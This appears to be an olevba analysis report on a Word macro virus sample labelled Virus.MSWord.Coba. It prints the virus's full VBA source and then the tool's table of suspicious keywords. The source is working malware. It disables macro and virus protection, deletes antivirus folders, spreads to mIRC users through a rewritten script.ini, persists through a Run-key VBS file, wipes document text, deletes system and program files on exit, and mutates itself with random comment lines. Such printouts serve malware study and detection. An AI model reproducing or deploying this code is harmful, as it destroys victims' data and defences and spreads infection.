olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Coba
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Coba - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO init.bas 
in file: ./Virus.MSWord.Coba - OLE stream: 'Macros/VBA/init'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    Rem 8.341134    33.96669    31.98241    205.7015    51.45497
    Rem 31.63511    9.004702    17.51385    167.7657    16.78434
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Sub init()
On Error Resume Next
ActiveDocument.ReadOnlyRecommended = False
If NormalTemplate.VBProject.VBComponents.Item("init").Name <> "init" Then
ActiveDocument.VBProject.VBComponents("init").Export ("C:\Windows\init.drv")
SetAttr "C:\Windows\init.drv", 6
    Rem 16.26751    34.38096    51.16499    199.1999    57.80993
End If
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = 0&
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "DAT") = "Just for FUN by FÖV"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "DATFile") = "No need Anti Virus"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\virusscan", "DAT") = "Don't Underestimate Me"
With Application
.EnableCancelKey = wdCancelDisabled
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 3.383723    71.38778    64.5328 97.35264    7.053098
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
    Rem 22.58474    30.54377    120.7942    65.58051    47.12764
.DisplayAlerts = wdAlertsNone
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
.ScreenUpdating = False
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
    Rem 34.90141    64.17252    2.666008    90.54031    23.71697
End With
    Rem 30.85721    62.50368    155.332 175.3116    1.335123
With Options
.ConfirmConversions = False
.VirusProtection = False
.SaveNormalPrompt = False
End With
If (Second(Now()) > 50) Then
    installed = Dir("C:\mirc\mirc32.exe")
    Rem 50.78949    55.81886    59.11349    31.34161    28.31872
    If installed = "" Then
    Exit Sub
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    Else
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    reproduce = Dir("C:\mirc\download\IRC-Rules.doc")
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    If reproduce = "" Then ActiveDocument.SaveAs "c:\mirc\download\IRC-Rules.doc"
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    Rem 28.44907    86.8828 94.77517    190.9329    38.77813
    Kill "C:\mirc\script.ini"
    Open "C:\mirc\script.ini" For Output As #1
    Print #1, "[script]"
    Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick C:\mirc\download\IRC-Rules.doc }"
    Print #1, "n1=on 1:CONNECT: {"
    Rem 12.30556    29.35296    133.3631    10.55519    30.56294
    Print #1, "n2=  /join #virus "
    Print #1, "n3=  /msg #virii by FÖV"
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Print #1, "n4= /part #virus"
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Print #1, "n5= /clear"
    Rem 2.646539    64.33347    90.6138 117.812 12.78728
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Print #1, "n6= /motd"
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Print #1, "n7= }"
    Close #1
    Rem 4.272658    38.94836    163.076 113.8261    29.16823
    End If
End If
JsLw = Int(Rnd * 100)
    If JsLw = 99 Then MsgBox "SkRiPsI is SuCK", vbSystemModal
If Month(Now()) = 1 Or 2 Or 3 Or 4 Or 5 Or 6 Or 12 Then Call Hapus
If Month(Now()) = 11 And Day(Now()) = 5 Then MsgBox "Happynes to all of you", vbInformation, "Birthday Greeting!!!"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "init") = "C:\Windows\System\init.vbs"
Open "C:\Windows\System\init.vbs" For Output As #1
         Print #1, "On Error Resume Next"
         Print #1, "' init.vbs by FÖV DJ"
         Print #1, "Set WordObj = CreateObject(""Word.Application"")"
         Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents(""init"")"
    Rem 54.65522    11.73784    4.910583    72.53224    32.31244
         Print #1, "WordObj.NormalTemplate.save"
         Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.import (""C:\Windows\init.drv"")"
    Rem 34.05532    44.08474    115.7393    186.186 21.8604
         Print #1, "WordObj.NormalTemplate.save"
    Rem 48.31115    54.93895    63.65348    81.79539    50.77477
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
         Print #1, "WordObj.Quit"
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
    Close #1
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
If ActiveDocument.VBProject.VBComponents.Item("init").Name <> "init" Then
    ActiveDocument.VBProject.VBComponents.import ("C:\Windows\init.drv")
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
    ActiveDocument.Save
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
    Rem 9.828144    31.22614    0.4259622   155.8918    49.61234
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
    End If
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
If ActiveDocument.VBProject.VBComponents.Item("init").Name = "init" Then If NormalTemplate.Saved = False Then NormalTemplate.Save
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
BxUiSjEj:
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
Call Polymorphic
    Rem 31.9647 18.87291    13.38051    188.0437    6.574542
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
End Sub
    Rem 38.66336    36.43782    137.9671    155.7739    25.82217
    Rem 54.19556    72.23286    118.3371    87.69583    43.3348
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
Sub HelpAbout()
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
    Rem 41.38984    80.21515    139.7283    37.14624    6.418366
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 34.24832    58.30391    44.8448 58.66183    48.95829
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    On Error Resume Next
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    Rem 12.94052    43.24273    43.28232    71.52738    2.651098
    Rem 16.10768    13.52802    90.0696 46.88497    34.48723
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    Msg = "Peace Words" & Chr(13) & Chr(10)
    Msg = Msg & "Welcome to my world" & Chr(13) & Chr(10)
    Msg = Msg & "Please enjoy your time" & Chr(13) & Chr(10)
    Msg = Msg & "BEFORE YOUR DIE"
    MsgBox Msg, 64, "Microsoft Word"
End Sub
Sub FileNew()
    On Error Resume Next
    Call KillAV
    Rem 29.86176    7.26222 107.8432    86.1077 56.66495
    Call init
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call init
    Call Polymorphic
    Rem 28.86776    69.04005    9.09577 124.4162    27.65331
End Sub
Sub FileSave()
    On Error Resume Next
    Rem 48.1786 43.02127    32.40768    143.6531    44.09753
    Rem 15.93158    82.74393    107.3962    131.8048    25.27892
    Call KillAV
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
    Call init
    Call Polymorphic
    ActiveDocument.Save
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
    Rem 5.837357    24.8511 109.318 178.311 29.38018
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
End Sub
    Rem 8.397225    55.78484    16.89969    43.05991    40.85855
    Rem 15.3054 14.43974    27.67967    135.7833    24.19432
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
Sub FileClose()
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
    On Error Resume Next
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
    Rem 29.87473    73.31976    91.95531    89.782  30.03502
    Rem 51.97341    10.9395 109.8117    73.04486    6.161505
    Rem 41.79885    22.1111 64.36305    83.42115    31.06782
    Rem 39.20018    29.35856    107.6404    43.58784    10.9748
    Rem 38.1147 5.804204    128.5357    147.108 29.32719
    Call KillAV
    Call init
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Call Polymorphic
    ActiveDocument.Close
End Sub
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
Sub FileSaveAs()
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
    On Error Resume Next
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
Dialogs(wdDialogFileSaveAs).Show
    Call KillAV
    Call init
    Rem 41.04951    67.70798    67.81849    189.6508    44.01441
    Call Polymorphic
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
    Rem 19.441  36.43507    45.85437    11.67463    14.38686
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
End Sub
    Rem 42.32288    75.1404 65.03678    41.06232    19.24327
Sub FileExit()
    Rem 14.14972    56.58767    92.15194    32.82346    55.37416
    Rem 11.33095    77.80811    100.0669    158.5307    54.7451
    Rem 10.06918    89.22622    80.13654    0.8441323   25.12511
    On Error Resume Next
    Call KillAV
    Call init
    Call Polymorphic
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "Welcome"
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "FÖV"
    Msg = "Please Turn-off your computer" & Chr(13) & Chr(10)
    Msg = Msg & "Don't Click bellow"
    MsgBox Msg, 16, "Microsoft Word"
    Rem 23.40168    51.5712 8.507652    114.996 12.18264
    Kill "C:\windows\command\*.*"
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    Kill "C:*.*"
    Kill "C:\progra~1\*.*"
    Msg = "You aren't obey my order" & Chr(13) & Chr(10)
    Msg = Msg & "May the God Bless You"
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    MsgBox Msg, 64, "FÖV"
    Rem 31.87352    26.06062    51.33116    162.6954    0.8270409
Finish:
    Rem 50.38902    38.7235 115.2511    105.5153    30.31051
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Rem 11.19703    18.68343    61.99697    120.4391    20.30667
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Application.Quit
End Sub
Sub AutoOpen()
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
    On Error Resume Next
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
    Call KillAV
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    Rem 40.1176 13.05004    43.8243 5.931857    48.84604
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Call init
    Rem 51.23577    46.54732    56.15114    182.3753    15.2846
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Call Polymorphic
End Sub
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    Rem 49.64133    51.73784    41.67957    180.6341    4.42207
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
Sub AutoExit()
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Rem 43.01763    14.55693    137.3226    42.54984    56.44898
    On Error Resume Next
    Rem 4.439305    41.21743    153.9741    54.88734    46.32752
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    SetAttr "C:\Autoexec.bat", 0
    Open "C:\Autoexec.bat" For Append As #1
    Print #1, "ECHO OFF"
    Print #1, "CLS"
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Print #1, "ECHO                ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·"
    Print #1, "ECHO                º  *****************************************  º"
    Rem 49.51836    20.8437 161.4839    177.6994    26.03176
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Print #1, "ECHO                º  *               FÖV DJ                  *  º"
    Print #1, "ECHO                º  *****************************************  º"
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
    Print #1, "ECHO                º  FÖV DJ wishes to thank the user            º"
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
    Print #1, "ECHO                º  of this computer because you have          º"
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    Print #1, "ECHO                º  helped to spread the good words of peace!  º"
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
    Print #1, "ECHO                º               ## FÖV DJ ##                  º"
    Print #1, "ECHO                ÓÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½"
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    Rem 14.11459    8.090691    5.261603    67.77071    46.6176
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
    Print #1, "CLS"
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    Close #1
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
    Rem 6.071277    9.876468    49.39818    83.76447    32.98231
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    Call KillAV
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
    Rem 27.8348 35.14243    18.25381    164.639 27.11881
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    Rem 22.08825    1.466793    28.51968    34.48917    30.07348
    Call init
    Call Polymorphic
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
End Sub
Sub AutoExec()
    On Error Resume Next
    Call KillAV
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
    Call init
    Call Polymorphic
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    Rem 54.82243    30.58255    84.18592    86.72324    41.02163
End Sub
Sub ToolsMacro()
    Beep
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
    Call Pesan1
    Call Polymorphic
    On Error Resume Next
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    Rem 44.03684    29.26849    165.3639    168.8961    39.81474
    StatusBar = "    Warning you enter the forbiden zone !!!"
    Application.Caption = "FÖV"
    Application.Username = "DJ"
    Counter = 0
    Do Until Counter = 15
       Counter = Counter + 1
    mciSendString "set cd door open", 0, 0, 0: mciSendString "set cd door closed", 0, 0, 0: mciSendString "set cd time format tmsf wait", 0, 0, 0: mciSendString "open cdaudio alias cd wait shareable", 0, 0, 0
    Loop
    Rem 43.51355    29.94223    76.66019    116.5738    47.39649
    Call Pesan2
End Sub
Sub ToolsOptions()
    Rem 32.7852 74.94572    3.18892 44.17741    4.363246
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
    On Error Resume Next
    Rem 44.79695    63.81341    7.709969    86.94687    50.89454
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
    Beep
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
    Options.VirusProtection = 1
    Options.SaveNormalPrompt = 1
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
    Dialogs(wdDialogToolsOptions).Show
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
    Call Polymorphic
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
    Rem 20.54449    86.57578    148.1458    11.80974    56.02384
End Sub
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
Sub FileTemplates()
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
    Beep
    Call Polymorphic
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
    On Error Resume Next
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
End Sub
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
Sub ViewVBCode()
    Beep
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
    Rem 32.40396    88.74838    154.8639    47.64186    41.01181
    Call Polymorphic
    On Error Resume Next
End Sub
Sub Hapus()
    On Error Resume Next
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Save
End Sub
Sub Pesan1()
    On Error Resume Next
    Msg = "Macro Function is not active" & Chr(13) & Chr(10)
    Msg = Msg & "Never use IT"
    Rem 20.50479    29.11993    131.0416    45.78008    26.3726
    MsgBox Msg, 16, "Microsoft Word"
End Sub
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
Sub Pesan2()
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
    Rem 48.16788    37.49836    20.92408    200.3732    47.04054
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
    On Error Resume Next
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
    Msg = "Did you enjoy your time ?" & Chr(13) & Chr(10)
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
    Msg = Msg & "Don't do it again OK!"
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
    MsgBox Msg, 16, "Microsoft Word"
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
    Rem 29.60355    36.57792    144.0317    173.5074    39.67323
End Sub
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
Sub Polymorphic()
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
On Error Resume Next
PoNu = Int(Rnd() * 28 + 1)
For Mutate = 1 To PoNu
PoRL = Application.VBE.ActiveVBProject.VBComponents("init").CodeModule.CountOfLines
PoLi = Int(Rnd() * PoRL + 1)
a = Rnd * 55: b = Rnd * 90: c = Rnd * 170: d = Rnd * 210: e = Rnd * 59
Application.VBE.ActiveVBProject.VBComponents("init").CodeModule.InsertLines PoLi, vbTab & "Rem " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & e
    Rem 13.37313    84.5974 19.43657    206.6932    37.34557
Next Mutate
End Sub
    Rem 51.31787    89.3315 142.7296    85.95789    47.51125
Sub KillAV()
On Error Resume Next
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
Kill "C:\Program Files\Command Software\F-PROT95\*.*"
    Rem 11.97899    34.10921    67.29353    59.11572    29.6989
Kill "C:\Program Files\FindVirus\*.*"
Kill "C:\Toolkit\FindVirus\*.*"
Kill "C:\Program Files\Quick Heal\*.*"
    Rem 3.350394    35.12623    62.04922    102.8779    9.184121
    Rem 13.41622    48.04858    18.08284    209.8771    39.89438
    Rem 14.21431    15.70357    118.0833    3.567626    20.00635
Kill "C:\Program Files\McAfee\VirusScan\*.*"
Kill "C:\Program Files\Norton AntiVirus\*.*"
Kill "C:\TBAVW95\*.*"
Kill "C:\VS95\*.*"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |winmm.dll           |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |init.vbs            |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

